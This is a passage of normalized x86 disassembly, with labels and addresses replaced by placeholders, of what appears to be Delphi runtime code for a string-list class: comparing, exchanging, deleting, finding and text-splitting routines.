mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
sub_419cb8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419d70
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_419d10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a630
mov eax [ ebp - 0x8 ]
push eax
push sub_41a8e0
push ebp
call sub_419cb8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419d70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e05
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e0c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404444
jne r-xdata
sub_419e1c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419e18
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
jmp sub_403a74
sub_419e54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419e9c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405df8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419e1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ea3
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_419eac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_419f62
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f69
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
sub_419f94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_41a003
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx edi
call sub_40408c
mov eax esi
call sub_41a970
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404220
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40c6b4
test eax eax
je r-xdata
mov eax ebx
xor edx edx
call sub_404684
mov edx eax
dec edx
mov eax ebx
call sub_404684
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a00a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41a018
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a069
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a070
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41a07c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41a0c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044f8
call sub_408c60
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0c8
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41a0d0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4040d0
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404128
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1e2
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042f8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042f8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
sub_41a1f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a277
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404038
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404558
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a27e
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_41a284
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a2fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a303
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a310
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a3d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404558
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a970
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404220
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c6b4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3da
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_41a3e4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a448
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b510
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a490
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a497
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41a49c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a539
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_41a51c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41aff8
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404128
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a523
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
sub_41a548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a5e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5f0
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_41a5cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
sub_41a5f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a630
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a6d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d24c
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_41a6af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c2e8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41deec
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6b6
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
sub_41a6e0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b510
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a72b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a732
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41a738
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a785
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b25c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a78c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41a798
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40594c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a7cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a80f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404230
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a816
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41a81c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a8d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor edx edx
push ebp
push sub_41a8b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8ba
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a8e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a956
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f480
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a95d
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420bf4
inc esi
dec ebx
jne r-xdata
sub_41a988
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a9a4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ad8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404aec
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41aa0c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e54
jmp r-xdata
sub_41aaa8
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404aec
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41aae8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404bd8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41ab54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419e54
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41abb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41abb0
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41abd4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41ac4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40408c
pop edi
pop esi
pop ebx
retn
sub_41ac88
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41acb0
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41ace4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a284
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41ad30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e54
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41ad84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
